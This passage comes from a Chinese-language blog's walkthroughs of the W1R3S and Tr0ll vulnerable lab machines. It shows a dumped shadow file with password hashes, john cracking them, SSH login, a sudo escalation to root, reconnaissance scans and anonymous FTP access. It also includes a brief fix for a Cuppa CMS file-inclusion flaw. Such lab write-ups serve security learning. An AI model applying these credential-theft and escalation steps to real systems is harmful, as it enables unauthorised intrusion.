class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line">sync:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;          </span><br></pre></td></tr></table></figure><p>用john爆一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ john hash</span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 6 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)     </span><br><span class="line">2g 0:00:00:01 DONE 2/3 (2024-06-30 16:02) 1.104g/s 2077p/s 2078c/s 2078C/s 123456..bigben</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br></pre></td></tr></table></figure><p>ssh连接，连接以后用whoami,id,uname -a,id都看一看，理论上说他有一个www-data一个w1r3s<br>的话，说明w1r3s是可以通过sudo提权的，试了试sudo -l获得了all:all:all的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh w1r3s@192.168.159.134</span><br><span class="line">----------------------</span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line">w1r3s@192.168.159.134&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">102 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br><span class="line">w1r3s@W1R3S:~$ whoami</span><br><span class="line">w1r3s</span><br><span class="line">w1r3s@W1R3S:~$ id</span><br><span class="line">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">w1r3s@W1R3S:~$ sudo id</span><br><span class="line">ls</span><br><span class="line">^C</span><br><span class="line">w1r3s@W1R3S:~$ sudo -l</span><br><span class="line">^C</span><br><span class="line">w1r3s@W1R3S:~$ uname -a</span><br><span class="line">Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">w1r3s@W1R3S:~$ id</span><br><span class="line">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">w1r3s@W1R3S:~$ sudo -l</span><br><span class="line">sudo: unable to resolve host W1R3S</span><br><span class="line">[sudo] password for w1r3s: </span><br><span class="line">Matching Defaults entries for w1r3s on W1R3S:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User w1r3s may run the following commands on W1R3S:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">w1r3s@W1R3S:~$ sudo /bin/bash</span><br><span class="line">sudo: unable to resolve host W1R3S</span><br><span class="line">root@W1R3S:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@W1R3S:~# whoami</span><br><span class="line">root</span><br><span class="line">root@W1R3S:~# cd root</span><br><span class="line">bash: cd: root: No such file or directory</span><br><span class="line">root@W1R3S:~# ls</span><br><span class="line">Desktop    Downloads         ftp    Pictures  Templates</span><br><span class="line">Documents  examples.desktop  Music  Public    Videos</span><br><span class="line">root@W1R3S:~# cd ../</span><br><span class="line">root@W1R3S:/home# ls</span><br><span class="line">w1r3s</span><br><span class="line">root@W1R3S:/home# cd  ../</span><br><span class="line">root@W1R3S:/# ls</span><br><span class="line">bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz</span><br><span class="line">boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old</span><br><span class="line">cdrom  home  lib             media       proc  sbin  sys   var</span><br><span class="line">root@W1R3S:/# cd root</span><br><span class="line">root@W1R3S:/root# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@W1R3S:/root# cat flag.txt </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  </span><br><span class="line">  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| </span><br><span class="line"> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ </span><br><span class="line"> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |</span><br><span class="line">  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ </span><br><span class="line">                                                                                        </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                          .-----------------TTTT_-----_______</span><br><span class="line">                        /&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;(______O] ----------____  \______/]_</span><br><span class="line">     __...---&#x27;&quot;&quot;&quot;\_ --&#x27;&#x27;   Q                               ___________@</span><br><span class="line"> |&#x27;&#x27;&#x27;                   ._   _______________=---------&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line"> |                ..--&#x27;&#x27;|   l L |_l   |</span><br><span class="line"> |          ..--&#x27;&#x27;      .  /-___j &#x27;   &#x27;</span><br><span class="line"> |    ..--&#x27;&#x27;           /  ,       &#x27;   &#x27;</span><br><span class="line"> |--&#x27;&#x27;                /           `    \</span><br><span class="line">                      L__&#x27;         \    -</span><br><span class="line">                                    -    &#x27;-.</span><br><span class="line">                                     &#x27;.    /</span><br><span class="line">                                       &#x27;-./</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">  YOU HAVE COMPLETED THE</span><br><span class="line">               __      __  ______________________   _________</span><br><span class="line">              /  \    /  \/_   \______   \_____  \ /   _____/</span><br><span class="line">              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ </span><br><span class="line">               \        /  |   ||    |   \/       \/        \</span><br><span class="line">                \__/\  /   |___||____|_  /______  /_______  /.INC</span><br><span class="line">                     \/                \/       \/        \/        CHALLENGE, V 1.0</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">CREATED BY SpecterWires</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://pic.imgdb.cn/item/668115f1d9c307b7e9e2a7a0.png" alt=""></p><p>这里的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include_once(realpath(__DIR__ . &#x27;/..&#x27;).&quot;/classes/Cuppa.php&quot;);</span><br></pre></td></tr></table></figure><br>这是include_once（）函数导致的文件包含漏洞，修复时可以改变其函数类型，也可以去掉. ‘/..’让其无法返回上级目录</p><p><a href="https://www.exploit-db.com/exploits/25971">顺便贴上cuppa的vol网址</a></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> w1r3s-editable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tr0ll</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8828%E6%97%A5-Troll/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8828%E6%97%A5-Troll/</url>
      
        <content type="html"><![CDATA[<p>Tr0ll</p><p>评价是相对而言比较简单的一个靶机</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -A  -p- 192.168.159.133</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 19:30 CST</span><br><span class="line">Nmap scan report for 192.168.159.133</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.159.129</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 600</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)</span><br><span class="line">|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)</span><br><span class="line">|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)</span><br><span class="line">|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/secret</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">MAC Address: 00:0C:29:39:E9:62 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.14 ms 192.168.159.133</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到开放了80端口，进去瞅一眼</p><p><img src="https://pic.imgdb.cn/item/667ea91fd9c307b7e9d0f402.png" alt=""></p><p>好xx的图</p><p>扫一下后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ dirsearch -u 192.168.159.133       </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/_192.168.159.133/_24-06-28_19-29-19.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.133/</span><br><span class="line"></span><br><span class="line">[19:29:19] Starting: </span><br><span class="line">[19:29:22] 403 -  293B  - /.ht_wsr.txt</span><br><span class="line">[19:29:22] 403 -  296B  - /.htaccess.bak1</span><br><span class="line">[19:29:22] 403 -  296B  - /.htaccess.save</span><br><span class="line">[19:29:22] 403 -  297B  - /.htaccess_extra</span><br><span class="line">[19:29:22] 403 -  294B  - /.htaccessBAK</span><br><span class="line">[19:29:22] 403 -  294B  - /.htaccessOLD</span><br><span class="line">[19:29:22] 403 -  296B  - /.htaccess.orig</span><br><span class="line">[19:29:22] 403 -  295B  - /.htaccessOLD2</span><br><span class="line">[19:29:22] 403 -  298B  - /.htaccess.sample</span><br><span class="line">[19:29:22] 403 -  286B  - /.htm</span><br><span class="line">[19:29:22] 403 -  296B  - /.htaccess_orig</span><br><span class="line">[19:29:22] 403 -  294B  - /.htaccess_sc</span><br><span class="line">[19:29:22] 403 -  287B  - /.html</span><br><span class="line">[19:29:22] 403 -  296B  - /.htpasswd_test</span><br><span class="line">[19:29:22] 403 -  293B  - /.httr-oauth</span><br><span class="line">[19:29:22] 403 -  292B  - /.htpasswds</span><br><span class="line">[19:30:11] 200 -   31B  - /robots.txt</span><br><span class="line">[19:30:12] 301 -  318B  - /secret  -&gt;  http://192.168.159.133/secret/</span><br><span class="line">[19:30:12] 200 -   37B  - /secret/</span><br><span class="line">[19:30:13] 403 -  295B  - /server-status</span><br><span class="line">[19:30:13] 403 -  296B  - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看一下扫描出来的</p><p><img src="https://pic.imgdb.cn/item/667ea96bd9c307b7e9d19263.png" alt=""></p><p>丑到我眼睛了</p><p>robots.txt里面经典没东西</p><p>回头看扫描发现有个ftp</p><h2 id="ftp隐匿登录"><a href="#ftp隐匿登录" class="headerlink" title="ftp隐匿登录"></a>ftp隐匿登录</h2><p>账号默认是FTP，密码空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 192.168.159.133      </span><br><span class="line">Connected to 192.168.159.133.</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">Name (192.168.159.133:kali): FTP</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">229 Entering Extended Passive Mode (|||64665|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; binary</span><br><span class="line">200 Switching to Binary mode.</span><br><span class="line">ftp&gt; get lol.pcap</span><br><span class="line">local: lol.pcap remote: lol.pcap</span><br><span class="line">229 Entering Extended Passive Mode (|||15984|).</span><br><span class="line">150 Opening BINARY mode data connection for lol.pcap (8068 bytes).</span><br><span class="line">100% |*************************************************|  8068      156.88 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">8068 bytes received in 00:00 (154.50 KiB/s)</span><br><span class="line">ftp&gt; </span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure><p>进去了，并且在里面发现一个lol.pcap</p><p>binary转换为二进制文件</p><p>get下来</p><p>在linux中查看问价的属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ file lol.pcap</span><br><span class="line">lol.pcap: pcapng capture file - version 1.0</span><br></pre></td></tr></table></figure><p>正常是要用wireshark进行分析的</p><p>但是我们主要是利用这个文件的文本信息，所以可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ strings lol.pcap </span><br><span class="line">Linux 3.12-kali1-486</span><br><span class="line">Dumpcap 1.10.2 (SVN Rev 51934 from /trunk-1.10)</span><br><span class="line">eth0</span><br><span class="line">host 10.0.0.6</span><br><span class="line">Linux 3.12-kali1-486</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">&quot;USER anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">PASS password</span><br><span class="line">230 Login successful.</span><br><span class="line">SYST</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">PORT 10,0,0,12,173,198</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">LIST</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">TYPE I</span><br><span class="line">W200 Switching to Binary mode.</span><br><span class="line">PORT 10,0,0,12,202,172</span><br><span class="line">g&gt;      @</span><br><span class="line">W200 PORT command successful. Consider using PASV.</span><br><span class="line">RETR secret_stuff.txt</span><br><span class="line">W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).</span><br><span class="line">WWell, well, well, aren&#x27;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</span><br><span class="line">Sucks, you were so close... gotta TRY HARDER!</span><br><span class="line">W226 Transfer complete.</span><br><span class="line">TYPE A</span><br><span class="line">O200 Switching to ASCII mode.</span><br><span class="line">&#123;PORT 10,0,0,12,172,74</span><br><span class="line">O200 PORT command successful. Consider using PASV.</span><br><span class="line">&#123;LIST</span><br><span class="line">O150 Here comes the directory listing.</span><br><span class="line">O-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt</span><br><span class="line">O226 Directory send OK.</span><br><span class="line">&#123;QUIT</span><br><span class="line">221 Goodbye.</span><br><span class="line">Counters provided by dumpcap</span><br></pre></td></tr></table></figure><p>感觉跟直接用记事本打开差不多？</p><p>里面有一个secret_stuff.txt文件</p><p>大概意思是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WWell, well, well, aren&#x27;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</span><br></pre></td></tr></table></figure></p><p>好好好，你差点找到了sup3rs3cr3tdirlol :-P这个玩意</p><p>访问一下</p><p>里面有一个roflmao文件，搞下来分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 